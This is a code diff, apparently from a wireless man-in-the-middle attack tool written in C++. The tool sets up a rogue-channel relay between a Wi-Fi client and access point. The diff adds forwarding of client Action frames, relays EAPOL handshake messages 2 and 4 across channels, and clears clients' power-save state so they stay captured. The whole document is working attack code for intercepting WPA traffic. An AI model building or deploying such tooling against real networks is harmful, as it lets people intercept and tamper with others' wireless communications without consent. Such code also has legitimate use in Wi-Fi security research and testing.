@@ -74,36 +74,45 @@ bool McMitm::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 
     return false;
 }
 
-void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
+bool McMitm::handle_action_rogue(PDU &pdu, const Dot11 &dot11) const{
+    if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return false;
+
+    const auto raw = const_cast<Dot11&>(dot11).serialize();
+    if(raw.size() < 16) return false;
+
+    const HWAddress<6> src(raw.data() + 10);
+    if(src == client_mac || clients.contains(src.to_string())){
+        log(LogLevel::DEBUG, "Rogue channel: Action from client → real channel");
+        sock_real->send(pdu, netconfig.real_channel);
+        return true;
+    }
+    return false;
+}
+
+void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
     auto *dot11 = pdu->find_pdu<Dot11>();
     if(!dot11) return;
 
-    HWAddress<6> addr2; // transmitter
-    if(const auto *mgmt = pdu->find_pdu<Dot11ManagementFrame>()){
-        addr2 = mgmt->addr2().to_string();
-    } else if(const auto *data = pdu->find_pdu<Dot11Data>()){
-        addr2 = data->addr2().to_string();
-    }else if(dot11->type() == Dot11::MANAGEMENT){
-        const auto raw = dot11->serialize();
-        if(raw.size() >= 16)
-            addr2 = HWAddress<6>(raw.data() + 10).to_string();
-    }else{
-        if(dot11->type() != Dot11::CONTROL) log(LogLevel::DEBUG, "Unknown frame type");
+    const auto [addr1, addr2] = get_addrs(*pdu, raw);
+    if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
+        log(LogLevel::DEBUG, "Unknown frame type");
         return;
     }
 
     //FIXME
     if(handle_open_auth(addr2, *dot11)) return;
-    if(handle_assoc_request(addr2, *pdu, *dot11)) return;;
-    if(handle_probe(addr2, pdu.get(), *dot11)) return;;
+    if(handle_assoc_request(addr2, *pdu, *dot11)) return;
+    if(handle_probe(addr2, pdu.get(), *dot11)) return;
+    if(handle_action_rogue(*pdu, *dot11)) return;
 
     // EAPOL od AP → forward na rogue channel
     if(addr2 == client_mac){
-        if(is_eapol(*pdu) && clients.contains(dot11->addr1().to_string())){
+        if(is_eapol(*pdu) && clients.contains(addr2.to_string())){
             int eapol_msg = get_eapol_msg_num(*pdu);
-            log(LogLevel::INFO, "Rogue channel: EAPOL {} from AP ->  real channel", eapol_msg);
-            if(eapol_msg == 2 || eapol_msg == 4) sock_rogue->send(*pdu, netconfig.rogue_channel);
+            log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA ->  real channel", eapol_msg);
+            if(eapol_msg == 2 || eapol_msg == 4) sock_real->send(*pdu, netconfig.real_channel);
             if(eapol_msg == 4 && only_to_mitm) stop_mitm = true;
+            return;
         }
     }
     if(addr2 == ap_mac){ // AP ->
@@ -149,7 +158,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
 
         // remove sleep option
         if(client != nullptr && will_forward){
-            if( power_mgmt(*dot11) && clients.contains(addr2.to_string()) &&
+            if( dot11->power_mgmt() && clients.contains(addr2.to_string()) &&
                 clients.at(addr2.to_string())->state < ClientState::Attack_Done){
                 log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2.to_string());
                 //dot11->power_mgmt(0);
